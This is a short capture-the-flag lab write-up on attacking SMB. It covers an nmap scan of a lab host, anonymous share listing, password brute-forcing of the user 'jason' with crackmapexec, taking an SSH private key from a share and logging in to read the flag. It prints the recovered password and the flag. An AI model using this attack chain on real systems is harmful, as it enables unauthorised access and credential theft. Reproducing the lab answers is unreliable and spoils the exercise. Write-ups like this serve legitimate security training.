# SMB

### What is the name of the shared folder with READ permissions?

```bash
nmap -sV -sC 10.129.4.241
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 71:08:b0:c4:f3:ca:97:57:64:97:70:f9:fe:c5:0c:7b (RSA)
|   256 45:c3:b5:14:63:99:3d:9e:b3:22:51:e5:97:76:e1:50 (ECDSA)
|_  256 2e:c2:41:66:46:ef:b6:81:95:d5:aa:35:23:94:55:38 (ED25519)
53/tcp  open  domain      ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Host script results:
|_nbstat: NetBIOS name: ATTCSVC-LINUX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time: 
|   date: 2024-02-22T12:05:39
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
```

lets check smb share

```bash
smbclient -N -L //10.129.4.241 
Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        GGJ             Disk      Priv
        IPC$            IPC       IPC Service (attcsvc-linux Samba)
```

GGJ

### What is the password for the username "jason"?

```bash
#we have wordlist from resources, download it
crackmapexec smb 10.129.4.241 -u jason -d . -p pws.list
SMB         10.129.4.241    445    ATTCSVC-LINUX    [+] .\jason:34c8zuNBo91!@28Bszh 
```

34c8zuNBo91!@28Bszh

### Login as the user "jason" via SSH and find the flag.txt file. Submit the contents as your answer.

```bash
smbclient //10.129.4.241/GGJ -U jason%'34c8zuNBo91!@28Bszh'
get id_rsa
#now we login with this id_rsa
chmod 600 id_rsa
ssh -i id_rsa jason@10.129.4.241 
cat flag.txt
HTB{SMB_4TT4CKS_2349872359}
```
